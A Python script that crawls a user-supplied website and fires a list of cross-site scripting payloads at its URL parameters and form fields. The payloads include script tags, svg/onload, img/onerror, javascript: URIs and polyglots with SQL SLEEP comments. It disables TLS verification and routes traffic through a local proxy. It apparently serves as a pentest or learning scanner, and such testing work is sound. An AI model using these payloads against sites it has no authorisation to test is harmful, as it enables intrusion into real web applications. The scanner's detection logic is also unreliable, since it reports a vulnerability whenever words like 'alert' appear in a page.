import requests, sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import random, re
from urllib.parse import urlparse, urljoin
from requests.exceptions import SSLError, ConnectionError
from colorama import Fore, Style, init

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

xss_payloads = [
    "<script>alert('Hacked')</script>",
    """><svg/onload=prompt(1)>"",
    "<svg/onload=prompt(1)",
    "<script>prompt.call`${1}`</script>",
    "--!><svg/onload=prompt(1)",
    "//prompt.ml%2f@⒕₨",
    "vbscript:prompt(1)#{"action":1}",
    """"><img src=1 onerror=alert(1)>""",
    "p'rompt(1)",
    "<svg><script>prompt&#40;1)</script>",
    '"><script>alert(document.domain)</script>',
    '" autofocus onfocus="alert(document.domain)',
    "javascript:alert('XSS')",
    "';alert('XSS');//",
    "'--><svg onload=alert()>",
    " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//",
    """ 1/*' or 1 or'" or 1 or"*//*" """,
    """“ onclick=alert(1)//<button value=Click_Me ‘ onclick=alert(1)//> */ alert(1); /*""",
    """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
    """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "'<script>alert('XSS')</script>'",
    "\"<script>alert('XSS')</script>\""
]

def get_response(url, retries=3):
    """
    Sends an HTTP GET request to the specified URL, with retries in case of failure.

    Args:
        url (str): The URL to send the request to.
        retries (int): The number of times to retry the request in case of failure. Default is 3.

    Returns:
        Response object if the request is successful (status code 200).
        Returns None if the maximum number of retries is reached without success.
    
    Raises:
        Prints a message if the request results in an error (e.g., ConnectionError, SSLError).
    """
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies, timeout=10)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                print(f"[+] Congratulations, your website is secure: access to {url} was blocked with a 403 (Forbidden) code.")
                return r
        except (requests.RequestException, SSLError, ConnectionError) as e:
            print(f"[-] Connection error to {url}: {e}")
            time.sleep(random.uniform(1, 3))
    print(f"[-] Failed to retrieve {url} after {retries} retries.")
    return None


# try to get paths with get parameter
def find_urls_to_test(url, base_url):
    """
    Attempts to discover URLs with GET parameters from the given page.

    Args:
        url (str): The URL of the page to be analyzed.
        base_url (str): The base URL used to build full URLs from relative links.

    Returns:
        set: A set of discovered URLs containing query parameters or potential targets.

    Description:
        - Retrieves the content of the page specified by `url`.
        - Parses the HTML and looks for `<a>` tags to extract links.
        - Builds full URLs from relative links based on the base URL.
        - Filters out liinks that don't match the base URL's domain.
        - Additionally searches through `<script>` content if no parameterized URLs are found.
        - Returns a set of URLs to test for vulnerabilities.
    """
    
    response = get_response(url)
    if not response:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')

    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)

    links = set()
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        if href.startswith('/'):
            full_url = base_url + href
        elif href.startswith('http'):
            full_url = href
        else:
            full_url = f"{base_url}/{href}"
            
        if "Id" not in href:
            links.add(full_url)
            if "?" in href:
              links.add(full_url)
            elif href.startswith('/'):
               links.add(full_url)
        
        #links.add(full_url)
      
    if not links:
        print("[!] No parameterized URLs found, searching deeper in the page source...")
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                print("[+] Found a possible URL in script content.")
                links.add(script.text)

    if not links:
        print("[-] No URLs with parameters found.")
    else:
        print(f"[+] Found {len(links)} URLs")
    
    return links

def get_forms_and_inputs(response, max_attempts=3):
    soup = BeautifulSoup(response.text, 'html.parser')

    # Buscar formularios y sus inputs
    forms = soup.find_all('form')

    # Buscar inputs en otros contenedores como 'div', 'section', etc.
    containers_with_inputs = []
    containers = soup.find_all(['div', 'section', 'article'])
    for container in containers:
        if container.find_all(['input', 'textarea', 'button']):
            containers_with_inputs.append(container)

    # Intentar de nuevo si no se encontraron formularios ni inputs
    attempt = 1
    while not forms and not containers_with_inputs and attempt <= max_attempts:
        time.sleep(1)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        containers_with_inputs = []
        containers = soup.find_all(['div', 'section', 'article'])
        for container in containers:
            if container.find_all(['input', 'textarea', 'button']):
                containers_with_inputs.append(container)
        attempt += 1

    result = {
        'forms': forms,
        'containers_with_inputs': containers_with_inputs
    }
    return result

def exploit_xss_url(url):
    for payload in xss_payloads:
        target_url = f"{url}?input={payload}"
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            
            if payload in r.text:
                print(Fore.GREEN + f"[+] 1XSS vulnerability found in URL with payload: {payload}")
                return True

            soup = BeautifulSoup(r.text, 'html.parser')
            title = soup.title.string if soup.title else ""
            if "error" in title.lower():
                print(Fore.GREEN + f"[+] XSS vulnerability found in error message with payload: {payload}"+ Style.RESET_ALL)
                return True

            error_message = soup.find('div', class_='message') or soup.find('div', class_='error')
            if error_message and payload in error_message.text:
                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
                return True

            if any(keyword in r.text.lower() for keyword in ['alert', 'onerror', 'onload']):
                print(Fore.GREEN + f"[+] 2XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
                return True

        except SSLError as e:
            print(f"[-] SSL Error on {target_url}: {e}")
        except requests.RequestException as e:
            print(f"[-] Request error on {target_url}: {e}")

    print("[-] No XSS vulnerabilities found in URL.")
    return False


def submit_xss_payloads_to_forms(url):
    response = get_response(url)
    if not response:
        return False

    forms_and_inputs = get_forms_and_inputs(response)
    forms = forms_and_inputs.get('forms', [])
    containers_with_inputs = forms_and_inputs.get('containers_with_inputs', [])
    
    if not forms and not containers_with_inputs:
        print("[-] No forms or inputs found on the page.")
        return False

    #print(f"Forms found: {len(forms)}")
    #print(f"Containers with inputs found: {len(containers_with_inputs)}")

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        form_url = urljoin(url, action)

        inputs = form.find_all('input')
        form_data = {}
        for input_tag in inputs:
            input_name = input_tag.get('name')
            if input_name:
                form_data[input_name] = random.choice(xss_payloads)
        
        for payload in xss_payloads:
            if method == 'post':
                r = requests.post(form_url, data=form_data, verify=False, proxies=proxies)
            else:
                r = requests.get(form_url, params=form_data, verify=False, proxies=proxies)

            if payload in r.text:
                print(Fore.GREEN + f"[+] XSS vulnerability found in form with payload: {payload}" + Style.RESET_ALL)
        
                return True

    for container in containers_with_inputs:
        inputs = container.find_all(['input', 'textarea', 'button'])
        if not inputs:
            continue

        form_data = {}
        for i, input_tag in enumerate(inputs):
            input_name = input_tag.get('name') or f'temp_name_{i}'
            form_data[input_name] = random.choice(xss_payloads)

        #print(f"Prepared form data for container: {form_data}")

        for payload in xss_payloads:
            r = requests.get(url, params=form_data, verify=False, proxies=proxies)
            if payload in r.text:
                print(Fore.GREEN + f"[+] XSS vulnerability found in container with payload: {payload}")
                return True

    print("[-] No XSS vulnerabilities found in forms or containers.")
    return False




if __name__ == "__main__":
    
    base_url = input("Enter the URL you want to scan: ").strip()
    base_url = base_url.rstrip('/')

    print("[+] Inspecting the different paths for the entered page...")
    urls_to_test = find_urls_to_test(base_url, base_url)

    if urls_to_test:
        # print("[+] Found the following URLs with parameters:")
        for url in urls_to_test:
            print(url)

        print("\n[+] Testing each URL for SQL Injection vulnerabilities...")

        for test_url in urls_to_test:
            print(f"\n[+] Testing URL: {test_url}")
            
            # Test for general SQL injection vulnerabilities
            #is_vulnerable = exploit_sqli(test_url)
             
            #if not is_vulnerable:
            #    num_col = exploit_sqli_column_number(test_url)
            #    if num_col:
                    #print(f"[+] Vulnerable URL found: {test_url}")
            #        print(f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
            #    else:
            #        print("[-] URL not vulnerable to sql injection")
            
            exploit_xss_url(test_url)
            submit_xss_payloads_to_forms(test_url)
            
    else:
        print("[-] No URLs with parameters found.")



